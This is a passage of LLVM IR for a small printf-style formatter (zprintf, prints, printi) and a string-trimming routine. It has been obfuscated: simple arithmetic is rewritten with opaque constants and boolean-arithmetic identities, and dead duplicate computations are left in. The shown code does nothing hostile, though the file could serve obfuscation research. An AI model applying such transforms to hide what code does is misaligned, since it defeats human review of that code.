; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, -1
  %48 = sub i32 %46, %47
  %49 = add nsw i32 %46, -1
  store i32 %48, i32* %5, align 4
  br label %30

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %77

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = add i32 %63, -345010013
  %66 = sub i32 %65, %64
  %67 = sub i32 %66, -345010013
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = add i32 %72, 670984675
  %74 = add i32 %73, 1
  %75 = sub i32 %74, 670984675
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %3, align 4
  br label %52

; <label>:77:                                     ; preds = %52
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub i32 %79, -634822524
  %82 = sub i32 %81, %80
  %83 = add i32 %82, -634822524
  %84 = sub nsw i32 %79, %80
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %78, i64 %85
  store i8 0, i8* %86, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %338, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %341

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %326

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %341

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %327

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 1505729098, -1
  %57 = and i32 %54, 1505729098
  %58 = and i32 %53, %56
  %59 = and i32 %55, 1505729098
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 1505729098, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %97, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 0, 48
  %90 = add i32 %88, %89
  %91 = sub nsw i32 %88, 48
  %92 = load i32, i32* %7, align 4
  %93 = add i32 %92, 1491695992
  %94 = add i32 %93, %90
  %95 = sub i32 %94, 1491695992
  %96 = add nsw i32 %92, %90
  store i32 %95, i32* %7, align 4
  br label %97

; <label>:97:                                     ; preds = %83
  %98 = load i8*, i8** %5, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %5, align 8
  br label %71

; <label>:100:                                    ; preds = %81
  %101 = load i8*, i8** %5, align 8
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 115
  br i1 %104, label %105, label %144

; <label>:105:                                    ; preds = %100
  %106 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = icmp ule i32 %108, 40
  br i1 %109, label %110, label %118

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 3
  %112 = load i8*, i8** %111, align 8
  %113 = getelementptr i8, i8* %112, i32 %108
  %114 = bitcast i8* %113 to i32*
  %115 = sub i32 0, 8
  %116 = sub i32 %108, %115
  %117 = add i32 %108, 8
  store i32 %116, i32* %107, align 8
  br label %123

; <label>:118:                                    ; preds = %105
  %119 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 2
  %120 = load i8*, i8** %119, align 8
  %121 = bitcast i8* %120 to i32*
  %122 = getelementptr i8, i8* %120, i32 8
  store i8* %122, i8** %119, align 8
  br label %123

; <label>:123:                                    ; preds = %118, %110
  %124 = phi i32* [ %114, %110 ], [ %121, %118 ]
  %125 = load i32, i32* %124, align 4
  %126 = sext i32 %125 to i64
  %127 = inttoptr i64 %126 to i8*
  store i8* %127, i8** %11, align 8
  %128 = load i8**, i8*** %4, align 8
  %129 = load i8*, i8** %11, align 8
  %130 = icmp ne i8* %129, null
  br i1 %130, label %131, label %133

; <label>:131:                                    ; preds = %123
  %132 = load i8*, i8** %11, align 8
  br label %134

; <label>:133:                                    ; preds = %123
  br label %134

; <label>:134:                                    ; preds = %133, %131
  %135 = phi i8* [ %132, %131 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.538, i32 0, i32 0), %133 ]
  %136 = load i32, i32* %7, align 4
  %137 = load i32, i32* %8, align 4
  %138 = call i32 @prints(i8** %128, i8* %135, i32 %136, i32 %137)
  %139 = load i32, i32* %9, align 4
  %140 = sub i32 %139, -1608289148
  %141 = add i32 %140, %138
  %142 = add i32 %141, -1608289148
  %143 = add nsw i32 %139, %138
  store i32 %142, i32* %9, align 4
  br label %338

; <label>:144:                                    ; preds = %100
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 100
  br i1 %148, label %149, label %179

; <label>:149:                                    ; preds = %144
  %150 = load i8**, i8*** %4, align 8
  %151 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %152 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 8
  %154 = icmp ule i32 %153, 40
  br i1 %154, label %155, label %164

; <label>:155:                                    ; preds = %149
  %156 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 3
  %157 = load i8*, i8** %156, align 8
  %158 = getelementptr i8, i8* %157, i32 %153
  %159 = bitcast i8* %158 to i32*
  %160 = add i32 %153, 1015720990
  %161 = add i32 %160, 8
  %162 = sub i32 %161, 1015720990
  %163 = add i32 %153, 8
  store i32 %162, i32* %152, align 8
  br label %169

; <label>:164:                                    ; preds = %149
  %165 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %151, i32 0, i32 2
  %166 = load i8*, i8** %165, align 8
  %167 = bitcast i8* %166 to i32*
  %168 = getelementptr i8, i8* %166, i32 8
  store i8* %168, i8** %165, align 8
  br label %169

; <label>:169:                                    ; preds = %164, %155
  %170 = phi i32* [ %159, %155 ], [ %167, %164 ]
  %171 = load i32, i32* %170, align 4
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  %174 = call i32 @printi(i8** %150, i32 %171, i32 10, i32 1, i32 %172, i32 %173, i32 97)
  %175 = load i32, i32* %9, align 4
  %176 = sub i32 0, %174
  %177 = sub i32 %175, %176
  %178 = add nsw i32 %175, %174
  store i32 %177, i32* %9, align 4
  br label %338

; <label>:179:                                    ; preds = %144
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 120
  br i1 %183, label %184, label %214

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %199

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = sub i32 %188, -344139598
  %196 = add i32 %195, 8
  %197 = add i32 %196, -344139598
  %198 = add i32 %188, 8
  store i32 %197, i32* %187, align 8
  br label %204

; <label>:199:                                    ; preds = %184
  %200 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %201 = load i8*, i8** %200, align 8
  %202 = bitcast i8* %201 to i32*
  %203 = getelementptr i8, i8* %201, i32 8
  store i8* %203, i8** %200, align 8
  br label %204

; <label>:204:                                    ; preds = %199, %190
  %205 = phi i32* [ %194, %190 ], [ %202, %199 ]
  %206 = load i32, i32* %205, align 4
  %207 = load i32, i32* %7, align 4
  %208 = load i32, i32* %8, align 4
  %209 = call i32 @printi(i8** %185, i32 %206, i32 16, i32 0, i32 %207, i32 %208, i32 97)
  %210 = load i32, i32* %9, align 4
  %211 = sub i32 0, %209
  %212 = sub i32 %210, %211
  %213 = add nsw i32 %210, %209
  store i32 %212, i32* %9, align 4
  br label %338

; <label>:214:                                    ; preds = %179
  %215 = load i8*, i8** %5, align 8
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 88
  br i1 %218, label %219, label %248

; <label>:219:                                    ; preds = %214
  %220 = load i8**, i8*** %4, align 8
  %221 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %222 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = icmp ule i32 %223, 40
  br i1 %224, label %225, label %233

; <label>:225:                                    ; preds = %219
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 3
  %227 = load i8*, i8** %226, align 8
  %228 = getelementptr i8, i8* %227, i32 %223
  %229 = bitcast i8* %228 to i32*
  %230 = sub i32 0, 8
  %231 = sub i32 %223, %230
  %232 = add i32 %223, 8
  store i32 %231, i32* %222, align 8
  br label %238

; <label>:233:                                    ; preds = %219
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 2
  %235 = load i8*, i8** %234, align 8
  %236 = bitcast i8* %235 to i32*
  %237 = getelementptr i8, i8* %235, i32 8
  store i8* %237, i8** %234, align 8
  br label %238

; <label>:238:                                    ; preds = %233, %225
  %239 = phi i32* [ %229, %225 ], [ %236, %233 ]
  %240 = load i32, i32* %239, align 4
  %241 = load i32, i32* %7, align 4
  %242 = load i32, i32* %8, align 4
  %243 = call i32 @printi(i8** %220, i32 %240, i32 16, i32 0, i32 %241, i32 %242, i32 65)
  %244 = load i32, i32* %9, align 4
  %245 = sub i32 0, %243
  %246 = sub i32 %244, %245
  %247 = add nsw i32 %244, %243
  store i32 %246, i32* %9, align 4
  br label %338

; <label>:248:                                    ; preds = %214
  %249 = load i8*, i8** %5, align 8
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 117
  br i1 %252, label %253, label %285

; <label>:253:                                    ; preds = %248
  %254 = load i8**, i8*** %4, align 8
  %255 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 8
  %258 = icmp ule i32 %257, 40
  br i1 %258, label %259, label %268

; <label>:259:                                    ; preds = %253
  %260 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %255, i32 0, i32 3
  %261 = load i8*, i8** %260, align 8
  %262 = getelementptr i8, i8* %261, i32 %257
  %263 = bitcast i8* %262 to i32*
  %264 = add i32 %257, 1774660705
  %265 = add i32 %264, 8
  %266 = sub i32 %265, 1774660705
  %267 = add i32 %257, 8
  store i32 %266, i32* %256, align 8
  br label %273

; <label>:268:                                    ; preds = %253
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %255, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  br label %273

; <label>:273:                                    ; preds = %268, %259
  %274 = phi i32* [ %263, %259 ], [ %271, %268 ]
  %275 = load i32, i32* %274, align 4
  %276 = load i32, i32* %7, align 4
  %277 = load i32, i32* %8, align 4
  %278 = call i32 @printi(i8** %254, i32 %275, i32 10, i32 0, i32 %276, i32 %277, i32 97)
  %279 = load i32, i32* %9, align 4
  %280 = sub i32 0, %279
  %281 = sub i32 0, %278
  %282 = add i32 %280, %281
  %283 = sub i32 0, %282
  %284 = add nsw i32 %279, %278
  store i32 %283, i32* %9, align 4
  br label %338

; <label>:285:                                    ; preds = %248
  %286 = load i8*, i8** %5, align 8
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 99
  br i1 %289, label %290, label %325

; <label>:290:                                    ; preds = %285
  %291 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %292 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 8
  %294 = icmp ule i32 %293, 40
  br i1 %294, label %295, label %304

; <label>:295:                                    ; preds = %290
  %296 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 3
  %297 = load i8*, i8** %296, align 8
  %298 = getelementptr i8, i8* %297, i32 %293
  %299 = bitcast i8* %298 to i32*
  %300 = add i32 %293, 747838111
  %301 = add i32 %300, 8
  %302 = sub i32 %301, 747838111
  %303 = add i32 %293, 8
  store i32 %302, i32* %292, align 8
  br label %309

; <label>:304:                                    ; preds = %290
  %305 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 2
  %306 = load i8*, i8** %305, align 8
  %307 = bitcast i8* %306 to i32*
  %308 = getelementptr i8, i8* %306, i32 8
  store i8* %308, i8** %305, align 8
  br label %309

; <label>:309:                                    ; preds = %304, %295
  %310 = phi i32* [ %299, %295 ], [ %307, %304 ]
  %311 = load i32, i32* %310, align 4
  %312 = trunc i32 %311 to i8
  %313 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %312, i8* %313, align 1
  %314 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %314, align 1
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %317 = load i32, i32* %7, align 4
  %318 = load i32, i32* %8, align 4
  %319 = call i32 @prints(i8** %315, i8* %316, i32 %317, i32 %318)
  %320 = load i32, i32* %9, align 4
  %321 = add i32 %320, -492695952
  %322 = add i32 %321, %319
  %323 = sub i32 %322, -492695952
  %324 = add nsw i32 %320, %319
  store i32 %323, i32* %9, align 4
  br label %338

; <label>:325:                                    ; preds = %285
  br label %337

; <label>:326:                                    ; preds = %17
  br label %327

; <label>:327:                                    ; preds = %326, %35
  %328 = load i8**, i8*** %4, align 8
  %329 = load i8*, i8** %5, align 8
  %330 = load i8, i8* %329, align 1
  %331 = zext i8 %330 to i32
  call void @printchar(i8** %328, i32 %331)
  %332 = load i32, i32* %9, align 4
  %333 = add i32 %332, -1742701922
  %334 = add i32 %333, 1
  %335 = sub i32 %334, -1742701922
  %336 = add nsw i32 %332, 1
  store i32 %335, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %327, %325
  br label %338

; <label>:338:                                    ; preds = %337, %309, %273, %238, %204, %169, %134
  %339 = load i8*, i8** %5, align 8
  %340 = getelementptr inbounds i8, i8* %339, i32 1
  store i8* %340, i8** %5, align 8
  br label %12

; <label>:341:                                    ; preds = %29, %12
  %342 = load i8**, i8*** %4, align 8
  %343 = icmp ne i8** %342, null
  br i1 %343, label %344, label %347

; <label>:344:                                    ; preds = %341
  %345 = load i8**, i8*** %4, align 8
  %346 = load i8*, i8** %345, align 8
  store i8 0, i8* %346, align 1
  br label %347

; <label>:347:                                    ; preds = %344, %341
  %348 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %349 = bitcast %struct.__va_list_tag* %348 to i8*
  call void @llvm.va_end(i8* %349)
  %350 = load i32, i32* %9, align 4
  ret i32 %350
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add i32 %22, -1606537198
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -1606537198
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, 459950214
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, 459950214
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 -443225840, -1
  %47 = or i32 %44, %45
  %48 = or i32 -443225840, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %82, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %75, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %81

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, 1
  store i32 %73, i32* %9, align 4
  br label %75

; <label>:75:                                     ; preds = %66
  %76 = load i32, i32* %7, align 4
  %77 = sub i32 %76, -1661651411
  %78 = add i32 %77, -1
  %79 = add i32 %78, -1661651411
  %80 = add nsw i32 %76, -1
  store i32 %79, i32* %7, align 4
  br label %63

; <label>:81:                                     ; preds = %63
  br label %82

; <label>:82:                                     ; preds = %81, %55
  br label %83

; <label>:83:                                     ; preds = %96, %82
  %84 = load i8*, i8** %6, align 8
  %85 = load i8, i8* %84, align 1
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %87, label %99

; <label>:87:                                     ; preds = %83
  %88 = load i8**, i8*** %5, align 8
  %89 = load i8*, i8** %6, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  call void @printchar(i8** %88, i32 %91)
  %92 = load i32, i32* %9, align 4
  %93 = sub i32 0, 1
  %94 = sub i32 %92, %93
  %95 = add nsw i32 %92, 1
  store i32 %94, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %87
  %97 = load i8*, i8** %6, align 8
  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %6, align 8
  br label %83

; <label>:99:                                     ; preds = %83
  br label %100

; <label>:100:                                    ; preds = %112, %99
  %101 = load i32, i32* %7, align 4
  %102 = icmp sgt i32 %101, 0
  br i1 %102, label %103, label %118

; <label>:103:                                    ; preds = %100
  %104 = load i8**, i8*** %5, align 8
  %105 = load i32, i32* %10, align 4
  call void @printchar(i8** %104, i32 %105)
  %106 = load i32, i32* %9, align 4
  %107 = sub i32 0, %106
  %108 = sub i32 0, 1
  %109 = add i32 %107, %108
  %110 = sub i32 0, %109
  %111 = add nsw i32 %106, 1
  store i32 %110, i32* %9, align 4
  br label %112

; <label>:112:                                    ; preds = %103
  %113 = load i32, i32* %7, align 4
  %114 = sub i32 %113, 56575751
  %115 = add i32 %114, -1
  %116 = add i32 %115, 56575751
  %117 = add nsw i32 %113, -1
  store i32 %116, i32* %7, align 4
  br label %100

; <label>:118:                                    ; preds = %100
  %119 = load i32, i32* %9, align 4
  ret i32 %119
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %128

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, -294283403
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, -294283403
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = add i32 %63, -107195180
  %65 = sub i32 %64, 48
  %66 = sub i32 %65, -107195180
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 %66, 665378350
  %69 = sub i32 %68, 10
  %70 = add i32 %69, 665378350
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = sub i32 %72, 1411000706
  %74 = add i32 %73, %70
  %75 = add i32 %74, 1411000706
